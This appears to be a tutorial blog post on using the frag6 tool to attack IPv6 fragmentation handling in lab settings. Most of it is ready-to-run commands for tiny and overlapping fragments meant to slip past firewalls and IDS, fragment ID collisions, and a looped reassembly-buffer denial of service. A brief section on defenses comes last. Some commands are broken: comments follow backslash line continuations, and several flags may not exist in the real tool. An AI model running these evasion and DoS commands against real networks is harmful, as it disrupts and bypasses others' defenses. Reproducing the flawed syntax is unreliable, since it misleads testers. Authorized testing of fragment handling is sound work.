# How to Use the SI6 Networks frag6 Tool for Fragmentation Attacks

Author: [nawazdhandala](https://www.github.com/nawazdhandala)

Tags: SI6 Networks, Frag6, IPv6, Fragmentation, Security Testing, IDS Evasion

Description: A guide to using the SI6 Networks frag6 tool to test IPv6 fragmentation handling, firewall evasion, and DoS vulnerabilities in authorized lab environments.

The `frag6` tool from the SI6 Networks IPv6 toolkit tests IPv6 fragmentation handling. Unlike IPv4, where routers can fragment packets, IPv6 fragmentation is performed only by the source host. The Fragment Extension Header is a known attack vector - fragmentation can be used to evade firewalls and IDS, trigger reassembly timeouts, and cause resource exhaustion. `frag6` enables testing these attack scenarios.

**Warning**: Only use in authorized lab environments with explicit written permission.

## Installing the SI6 Networks Toolkit

```bash
sudo apt-get install ipv6toolkit   # Debian/Ubuntu
sudo pacman -S ipv6toolkit          # Arch Linux
```

## IPv6 Fragmentation Basics

IPv6 uses a Fragment Extension Header (Next Header value 44) to carry fragmented packets. Each fragment includes:
- Fragment ID (32-bit, identifies which fragments belong together)
- Fragment Offset (13-bit, position of this fragment in original datagram)
- More Fragments (M) flag

## Basic frag6 Usage

```bash
# Send fragmented packets to a target

sudo frag6 -i eth0 -d 2001:db8::target

# Fragment at a specific size
sudo frag6 -i eth0 -d 2001:db8::target --frag-size 64

# Send overlapping fragments (tests reassembly ambiguity)
sudo frag6 -i eth0 -d 2001:db8::target --overlap

# Send a fragmented packet with a specific payload
sudo frag6 -i eth0 -d 2001:db8::target --data "test payload"
```

## Tiny Fragment Attack

Small fragments can cause some firewalls to fail to inspect the upper-layer header:

```bash
# Send extremely small fragments (8 bytes - minimum)
sudo frag6 -i eth0 -d 2001:db8::target --frag-size 8

# The first fragment is too small to contain the full TCP/UDP header
# Some firewalls pass these without proper inspection
```

## Overlapping Fragment Attack

Overlapping fragments cause ambiguity during reassembly - different OSes use different policies to resolve overlaps:

```bash
# Send overlapping fragments (may bypass IDS signatures)
sudo frag6 -i eth0 -d 2001:db8::target \
  --overlap \
  --overlap-data "AAAA"    # Data in overlapping region

# Test different overlap strategies
sudo frag6 -i eth0 -d 2001:db8::target --overlap-type first
sudo frag6 -i eth0 -d 2001:db8::target --overlap-type last
```

## Fragment ID Prediction and Collision

```bash
# Set a specific Fragment ID
sudo frag6 -i eth0 -d 2001:db8::target --frag-id 12345

# Send multiple fragments with same ID but different offsets (fragment confusion)
sudo frag6 -i eth0 -d 2001:db8::target --frag-id 12345 --frag-offset 0
sudo frag6 -i eth0 -d 2001:db8::target --frag-id 12345 --frag-offset 8
```

## Reassembly Timeout DoS

IPv6 hosts maintain a reassembly buffer for incomplete fragment sets. Sending first fragments without final fragments fills this buffer:

```bash
# Send first fragments only (M-bit set, no final fragment)
# Fills reassembly buffer until timeout (typically 60 seconds)
sudo frag6 -i eth0 -d 2001:db8::target \
  --frag-id-shuffle \    # Different fragment IDs
  --no-last-frag \       # Never send the completing fragment
  --loop \
  --sleep 0 \
  --loop-count 10000
```

## Testing Firewall Fragment Inspection

```bash
# Test whether firewall passes fragmented ICMPv6
sudo frag6 -i eth0 -d 2001:db8::target --proto icmpv6 --frag-size 16

# Test whether firewall passes fragmented TCP (trying to evade port filters)
sudo frag6 -i eth0 -d 2001:db8::target --proto tcp --dport 443 --frag-size 8
```

## Defenses Against IPv6 Fragmentation Attacks

```bash
# On Linux: limit fragment reassembly time and memory
sysctl -w net.ipv6.ip6frag_time=30        # 30 second timeout (default 60)
sysctl -w net.ipv6.ip6frag_high_thresh=4194304  # 4MB max reassembly memory

# Block all fragmented IPv6 with ip6tables (if your app doesn't need it)
sudo ip6tables -A INPUT -m frag --fragmore -j DROP

# Linux kernel drops packets with fragment + routing header together
# (mitigates some evasion techniques)
```

| Attack Type | Defense |
|---|---|
| Tiny fragments | Firewall minimum fragment size enforcement |
| Overlapping fragments | RFC 5722 - discard overlapping fragments |
| Reassembly DoS | Reduce frag timeout, limit memory |
| Header inspection evasion | Deep packet inspection with reassembly |

`frag6` testing is essential for validating that firewalls and IDS systems properly handle fragmented IPv6 traffic and that reassembly defenses are correctly configured.
